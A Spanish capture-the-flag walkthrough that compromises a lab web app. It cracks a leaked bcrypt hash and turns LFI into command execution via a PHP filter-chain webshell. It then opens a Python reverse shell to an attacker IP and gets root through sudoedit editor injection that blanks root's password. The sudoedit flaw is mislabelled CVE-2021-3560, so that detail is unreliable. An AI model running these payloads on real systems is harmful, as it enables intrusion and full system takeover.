---
icon: flag
---

# Queuemedic DockerLabs (Hard)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip insanity.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh insanity.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 03:46 EST
Nmap scan report for insanity.dl (172.17.0.2)
Host is up (0.000043s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: LOGIN | Clinic Queuing System
|_Requested resource was ./login.php
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

Si entramos en la pagina veremos un login, el cual si ponemos las credenciales por defecto veremos que no funciona, vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/article.html         (Status: 200) [Size: 0]
/auth.php             (Status: 302) [Size: 0] [--> ./login.php]
/backup               (Status: 301) [Size: 309] [--> http://172.17.0.2/backup/]
/css                  (Status: 301) [Size: 306] [--> http://172.17.0.2/css/]
/db                   (Status: 301) [Size: 305] [--> http://172.17.0.2/db/]
/home.php             (Status: 200) [Size: 1522]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/js                   (Status: 301) [Size: 305] [--> http://172.17.0.2/js/]
/login.php            (Status: 200) [Size: 4157]
/patients.php         (Status: 500) [Size: 3611]
/registration.php     (Status: 200) [Size: 4365]
/server-status        (Status: 403) [Size: 275]
/reports.php          (Status: 500) [Size: 3085]
/users.php            (Status: 500) [Size: 0]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos bastantes cosas interesantes al realizar un poco de `fuzzing`, vamos a probar a entrar en la carpeta `/backup` y veremos lo siguiente:

Vemos que hay un archivo llamado `backup.zip`, que si nos lo descargamos y lo descomprimimos, veremos lo siguiente:

```shell
cat db/clinic_queuing_db.db
```

Info:

```
SQLite format 3@  .WJ
�V
  ��Q%%�etablepatient_listpatient_listCREATE TABLE `patient_list` (
            `patient_id` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
            `queue_no` TEXT NOT NULL,
            `fullname` INTEGER NOT NULL,
            `address` TEXT NOT NULL,
            `contact` TEXT NOT NULL,
            `age` INTEGER NOT NULL,
            `weight` FLOAT NOT NULL Default 0,
            `bp_rate` TEXT NULL,
            `status` TINYINT(2) NOT NULL Default 0,
            `notify` TINYINT(2) NOT NULL Default 1,
            `date_created` TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�'�tableuser_listuser_listCREATE TABLE `user_list` (
            `user_id` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
            `fullname` INTEGER NOT NULL,
            `username` TEXT NOT NULL,
            `password` TEXT NOT NULL,
            `type` TINYINT(1) NOT NULL Default 0,
            `status` TINYINT(1) NOT NULL Default 0,
            `date_created` TIMESTAMP DEFAULT CURRENT_TIMESTAMP
%�%m    )               3Jessica Castrojessica$2y$10$iDHQftaCCEPmdPj/11E3DOGiw3AsOPf6uYBpEAuh8J19oeGuloJIK2024-09-20 14:15:46j  '�              3Administrato                                
```

Vemos una linea bastante interesante que pone un nombre de usuario y un `hash` asociado a dicho usuario.

```
Jessica Castro
jessica$2y$10$iDHQftaCCEPmdPj/11E3DOGiw3AsOPf6uYBpEAuh8J19oeGuloJIK
```

Vamos a crear un diccionario con el nombre de usuario mas su apellido, para poder generar varios formatos y asi probar con cada uno de ellos.

URL = [Herramienta Generador](https://github.com/urbanadventurer/username-anarchy)

> username

```
jessica castro
```

Y lo ejecutamos de la siguiente forma:

```shell
./username-anarchy -i username > users.txt
```

Y esto nos habra generado dicho archivo que contendra lo siguiente:

```
jessica
jessicacastro
jessica.castro
jessicac
jesscast
j.castro
jcastro
cjessica
c.jessica
castroj
castro
castro.j
castro.jessica
jc
```

> hash

```
$2y$10$iDHQftaCCEPmdPj/11E3DOGiw3AsOPf6uYBpEAuh8J19oeGuloJIK
```

Y ahora vamos a intentar saber que password es la correcta para el nombre de usuario `jessica`:

```shell
john --wordlist=users.txt hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 14 candidates left, minimum 24 needed for performance.
j.castro         (?)     
1g 0:00:00:00 DONE (2025-01-23 04:09) 14.28g/s 200.0p/s 200.0c/s 200.0C/s jessica..jc
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que el que nos interesa es la contraseña `j.castro` es el que coincide con el `hash`.

Por lo que ahora iniciaremos sesion con las credenciales que encontramos:

```
User: jessica
Pass: j.castro
```

Y vemos que estaremos dentro logeados con dicho usuario:

<figure><img src="../../.gitbook/assets/image (170) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que si le damos alguna de las opciones que esta en el `header` en la `URL` lleva un parametro llamado `?page=` vamos a ver si se puede utilizar algun `Wrapper` de `LFI` para poder hacer un parametro `cmd=` y asi poder ejecutar comandos del sistema.

### Wrappers de LFI

URL\_Script = https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit/blob/main/filters\_chain\_oracle\_exploit.py

Si queremos por ejemplo crear un parametro llamado `cmd` que ejecute cualquier comando que le pongamos, seria de la siguiente forma...

```shell
$ python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

Info:

```
[+] The following gadget chain will generate the following code : <?php echo shell_exec($_GET["cmd"]);?> (base64 value: PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjbWQiXSk7Pz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Copiamos eso y lo metemos despues del igual de la siguiente manera...

```
URL = http://<IP>/?cmd=ls -la&page=<CONTENT_GENERATE>
```

Info:

```
total 172
drwxr-xr-x 1 www-data www-data  4096 Sep 20 09:26 .
drwxr-xr-x 1 root     root      4096 Sep 20 09:08 ..
-rw-rw-r-- 1 www-data www-data  1945 Sep 19 10:12 DBConnection.php
-rw-rw-r-- 1 www-data www-data  9840 Sep 18 14:31 LoginRegistration.php
-rw-rw-r-- 1 www-data www-data  9527 Sep 19 10:30 Master.php
-rw-rw-r-- 1 www-data www-data     0 Apr 11  2023 article.html
-rw-rw-r-- 1 www-data www-data   748 Mar 23  2023 auth.php
drwxr-xr-x 2 www-data www-data  4096 Sep 20 09:21 backup
drwxrwxr-x 1 www-data www-data  4096 Apr 11  2023 css
drwxr-xr-x 1 www-data www-data  4096 Sep 20 09:15 db
-rw-rw-r-- 1 www-data www-data  1671 Apr 14  2023 home.php
-rw-rw-r-- 1 www-data www-data 11156 Apr 14  2023 index.php
drwxrwxr-x 1 www-data www-data  4096 Apr 11  2023 js
-rw-rw-r-- 1 www-data www-data  4418 Apr 14  2023 login.php
-rw-rw-r-- 1 www-data www-data  5931 Apr 14  2023 manage_patient.php
-rw-rw-r-- 1 www-data www-data  4735 Apr 12  2023 manage_user.php
-rw-rw-r-- 1 www-data www-data  7122 Sep 19 10:29 patient_side.php
-rw-rw-r-- 1 www-data www-data 11759 Sep 19 10:30 patients.php
-rw-rw-r-- 1 www-data www-data  5708 Apr 14  2023 queueing.php
-rw-rw-r-- 1 www-data www-data  4549 Mar 23  2023 registration.php
-rw-rw-r-- 1 www-data www-data  8147 Sep 19 10:31 reports.php
-rw-rw-r-- 1 www-data www-data  3575 Apr 11  2023 update_account.php
-rw-rw-r-- 1 www-data www-data  4790 Apr 12  2023 users.php
-rw-rw-r-- 1 www-data www-data  5526 Sep 19 10:34 view_patient.php
�
P�����
```

Vemos que funciona, por lo que vamos a crearnos una `reverse shell` mediante la `URL` de la siguiente forma:

```
URL = http://<IP>/?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'&page=<CONTENT_GENERATE>
```

Antes de ejecutarlos estaremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y si ejecutamos lo de la `URL` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 44696
$ whoami
whoami
www-data
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user jessica

Si probamos a utilizar la misma contraseña que en la pagina veremos que funciona:

```shell
su jesssica
```

Metemos como contraseña `j.castro` y veremos que estamos dentro.

## Privilege Escalation

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for jessica on 9ea7af8cd4f5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jessica may run the following commands on 9ea7af8cd4f5:
    (root) NOPASSWD: sudoedit /var/www/html/*
```

Veremos que podemos ejecutar `sudoedit` en la siguiente ruta como el usuario `root`, por lo que haremos lo siguiente:

Vemos que esto tiene una vulnerabilidad con un `CVE` asociado llamado `CVE-2021-3560` y que su descripcion es la siguiente:

```
Descripción de la vulnerabilidad

En Sudo anterior a 1.9.12p2, la característica sudoedit (también conocida como -e) maneja mal argumentos adicionales pasados ​​en las variables de entorno proporcionadas por el usuario (SUDO_EDITOR, VISUAL y EDITOR), permitiendo a un atacante local agregar entradas arbitrarias a la lista de archivos para procesar. . Esto puede conducir a una escalada de privilegios. Las versiones afectadas son 1.8.0 a 1.9.12.p1. El problema existe porque un editor especificado por el usuario puede contener un argumento "--" que anula un mecanismo de protección, por ejemplo, un valor EDITOR='nano -- /path/to/extra/file'.
```

Mas info en el siguiente repositorio:

URL = [Info CVE-2021-3560](https://github.com/asepsaepdin/CVE-2023-22809)

Por lo que vemos lo que a nosotros nos interesa es editar el `passwd`.

```shell
export EDITOR='nano -- /etc/passwd'
```

Ahora ejecutamos lo siguiente:

```shell
sudo sudoedit /var/www/html/testfile
```

Esto nos abrira el `passwd` por lo que eliminaremos la `x` del usuario `root` para quitarle la contraseña quedando asi:

```
root::0:0:root:/root:/bin/bash
```

Lo guardamos con `^X` despues `Y` y por ultimo `ENTER` y con esto ya estaria aplicado.

```shell
su root
```

Y veremos que seremos `root` sin que nos pida ninguna contarseña de forma previa.
